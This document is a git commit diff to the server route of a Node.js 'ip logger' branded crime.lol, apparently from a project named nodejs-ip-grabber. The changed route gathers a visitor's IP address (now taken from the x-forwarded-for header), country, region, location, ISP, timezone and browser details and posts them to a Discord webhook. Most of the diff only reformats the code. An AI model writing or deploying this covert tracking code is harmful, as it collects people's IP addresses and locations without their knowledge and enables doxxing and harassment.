120e844bf25cd328abab2b15d3590869a1651f77
maxwalks <78441835+maxwalks@users.noreply.github.com>
2024-07-30 15:12:07 +0200

    commit

--- server/routes/main.js
+++ server/routes/main.js
@@ -17,63 +17,70 @@ router.get("/", (req, res, next) => {
 });
 
 router.post("/collect-info", async (req, res) => {
-  const data = req.body
-  console.log(data.ipInfo.YourFuckingIPAddress)
+  const data = req.body;
   const embedData = {
     embeds: [
-        {
-            title: "<:crime10:1265004490554212464> crime.lol | ip logger",
-            url: "https://crime.lol",
-            author: {
-                name: "maxwalks",
-                url: "https://github.com/maxwalks/nodejs-ip-grabber",
-                icon_url: "https://cdn.discordapp.com/attachments/1198679960076959825/1234152158899736717/logo.jpg?ex=662fb144&is=662e5fc4&hm=f87965035d55d0045c6fc480e3b0015f8c9c5d9cbb4bc9e4138e5ecf3405d1c4&"
-            },
-            thumbnail: {
-                url: "https://files.catbox.moe/udd67s.png"
-            },
-            image: {
-                url: "https://files.catbox.moe/lpsllj.png"
-            },
-            fields: [
-                { name: "IP Address", value: `${data.ipInfo.YourFuckingIPAddress}` },
-                { name: "Country", value: `${data.detailedInfo.country}`},
-                { name: "Region", value: `${data.detailedInfo.regionName}`},
-                { name: "Full Location", value: `${data.ipInfo.YourFuckingLocation}`},
-                { name: "Timezone", value: `${data.detailedInfo.timezone}`},
-                { name: "ISP", value: `${data.detailedInfo.org}`},
-                { name: "Organization", value: `${data.detailedInfo.org}`},
-                { name: "Autonomous System", value: `${data.detailedInfo.as}`},
-                { name: "Browser Name", value: `${data.browserInfo.name}`},
-                { name: "Platform Name", value: `${data.browserInfo.name}`},
-                { name: "Mobile/Tablet", value: `${data.browserInfo.isMobile || data.browserInfo.isTablet ? 'Yes': "No"}`}
-            ],
-            footer: {
-                text: "crime.lol"
-            },
-            timestamp: new Date(),
-            color: 0x318e90
-        }
-    ]
-};
-const discordWebhookUrl = process.env.WEBHOOK_URI
-try {
+      {
+        title: "<:crime10:1265004490554212464> crime.lol | ip logger",
+        url: "https://crime.lol",
+        author: {
+          name: "maxwalks",
+          url: "https://github.com/maxwalks/nodejs-ip-grabber",
+          icon_url:
+            "https://cdn.discordapp.com/attachments/1198679960076959825/1234152158899736717/logo.jpg?ex=662fb144&is=662e5fc4&hm=f87965035d55d0045c6fc480e3b0015f8c9c5d9cbb4bc9e4138e5ecf3405d1c4&",
+        },
+        thumbnail: {
+          url: "https://files.catbox.moe/udd67s.png",
+        },
+        image: {
+          url: "https://files.catbox.moe/lpsllj.png",
+        },
+        fields: [
+          { name: "IP Address", value: `${req.headers["x-forwarded-for"]}` },
+          { name: "Country", value: `${data.detailedInfo.country}` },
+          { name: "Region", value: `${data.detailedInfo.regionName}` },
+          {
+            name: "Full Location",
+            value: `${data.ipInfo.YourFuckingLocation}`,
+          },
+          { name: "Timezone", value: `${data.detailedInfo.timezone}` },
+          { name: "ISP", value: `${data.detailedInfo.org}` },
+          { name: "Organization", value: `${data.detailedInfo.org}` },
+          { name: "Autonomous System", value: `${data.detailedInfo.as}` },
+          { name: "Browser Name", value: `${data.browserInfo.name}` },
+          { name: "Platform Name", value: `${data.browserInfo.name}` },
+          {
+            name: "Mobile/Tablet",
+            value: `${
+              data.browserInfo.isMobile || data.browserInfo.isTablet
+                ? "Yes"
+                : "No"
+            }`,
+          },
+        ],
+        footer: {
+          text: "crime.lol",
+        },
+        timestamp: new Date(),
+        color: 0x318e90,
+      },
+    ],
+  };
+  const discordWebhookUrl = process.env.WEBHOOK_URI;
+  try {
     const response = await axios.post(discordWebhookUrl, embedData, {
-        headers: {
-            'Content-Type': 'application/json'
-        }
+      headers: {
+        "Content-Type": "application/json",
+      },
     });
 
     if (response.status !== 204) {
-        throw new Error('Failed to send embed');
+      throw new Error("Failed to send embed");
     }
-
-    res.status(200).send('Embed sent successfully!');
-} catch (error) {
-    console.error('Error sending embed:', error);
-    res.status(500).send('Failed to send embed');
-}
-})
+  } catch (error) {
+    console.error("Error sending embed:", error);
+  }
+});
 
 router.get('/error', (req, res) => {
   res.status(500).json({ error: "No ip address detected, server is likely running in localhost. Please use a proxy." })
